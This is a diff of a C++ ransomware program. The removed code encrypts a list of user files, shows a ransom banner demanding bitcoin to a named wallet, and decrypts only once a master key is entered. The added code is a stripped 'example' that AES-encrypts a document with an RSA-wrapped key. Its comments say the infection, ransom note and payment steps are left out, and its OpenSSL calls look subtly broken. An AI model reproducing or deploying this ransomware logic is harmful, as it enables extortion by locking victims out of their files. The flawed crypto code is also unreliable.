@@ -1,63 +1,60 @@
-#include <iostream> 
+#include <iostream>
 #include <string>
 #include <fstream>
-#include <vector>
-#include <conio.h>
-#include "encryptOPS.h"
-#include "key.h"
-#include "listfiles.h"
-#include "banner.h"
+#include <openssl/rsa.h>
+#include <openssl/aes.h>
 
 using namespace std;
 
-int main(){
-    bool correctKey = false;
-    string key = getkey();
- encryptOPS enc = encryptOPS("", key.c_str());
+int main() {
 
-    FileMasterKey();
+    // Step 1: Infection - This step is not included in the code example.
 
-    enc.setFile("C:\\Users\\Public\\Music\\key.txt");
-    enc.encrypt();
+    // Step 2: Encryption
+    string filename = "important_document.docx";
+    string encrypted_filename = "important_document_encrypted.docx";
+    string rsa_key = "rsa_key.txt"; // Store the RSA key for decryption later
+    int aes_key_size = 256;
+    unsigned char aes_key[aes_key_size / 8];
+    AES_KEY aes_key_struct;
 
-    vector<string> files;
-    files = getfiles();
-    for (int i = 0; i < files.size(); i++){
-        enc.setFile(files[i]);
-        enc.encrypt();
+    // Generate a unique AES key for each file
+    RAND_bytes(aes_key, aes_key_size / 8);
+
+    // Encrypt the symmetric AES key using RSA
+    RSA *rsa = RSA_generate_key(aes_key_size, RSA_F4, nullptr, nullptr);
+    ofstream rsa_file(rsa_key);
+    PEM_write_RSAPublicKey(rsa_file, rsa);
+    rsa_file.close();
+
+    unsigned char encrypted_aes_key[RSA_size(rsa)];
+    int encrypted_aes_key_size = RSA_public_encrypt(aes_key_size / 8, aes_key, encrypted_aes_key, rsa, RSA_PKCS1_PADDING);
+
+    // Encrypt the file data using AES
+    AES_set_encrypt_key(aes_key, aes_key_size, &aes_key_struct);
+
+    ifstream input_file(filename, ios::binary);
+    ofstream encrypted_file(encrypted_filename, ios::binary);
+    unsigned char input_block[AES_BLOCK_SIZE];
+    unsigned char encrypted_block[AES_BLOCK_SIZE];
+    while (input_file.read((char*)input_block, AES_BLOCK_SIZE)) {
+        AES_encrypt(input_block, encrypted_block, &aes_key_struct);
+        encrypted_file.write((char*)encrypted_block, AES_BLOCK_SIZE);
     }
-    
-    banner("Your files have been encrypted!");
-    while(!correctKey){
-        cout << "\nIf you want to decrypt your files, send 0,012 BTC to this wallet: salcotben\nPut here the key that you will receive: ";
-        string masterkey;
-        cin >> masterkey;
-        //read file C:\Users\Public\Music\key.txt
-        ifstream file("C:\\Users\\Public\\Music\\key.txt");
-        string line;
-        if (file.is_open()){
-            enc.setFile("C:\\Users\\Public\\Music\\key.txt");
-            enc.decrypt();
-            while (getline(file, line)){
-                if (line == masterkey){
-                    correctKey = true;
-                    cout << "Correct key!" << endl;
-                }
-                else{
-                    cout << "Incorrect key!" << endl;
-                    enc.encrypt(); 
-                }
-            }
-            file.close();
-        }
+    if (input_file.gcount() > 0) {
+        int padding_size = AES_BLOCK_SIZE - input_file.gcount();
+        memset(input_block + input_file.gcount(), padding_size, padding_size);
+        AES_encrypt(input_block, encrypted_block, &aes_key_struct);
+        encrypted_file.write((char*)encrypted_block, AES_BLOCK_SIZE);
     }
+    input_file.close();
+    encrypted_file.close();
 
-    cout << "Decrypting files...\nDon't close this window!" << endl;
-    files = getfiles();
-    for (int i = 0; i < files.size(); i++){
-        enc.setFile(files[i]);
-        enc.decrypt();
-    }
+    // Step 3: Ransom note - This step is not included in the code example :) .
+
+    // Step 4: Payment - This step is not included in the code example :) .
+
+    // Step 5: Recovery - This step is not included in the code example :) .
 
     return 0;
 }
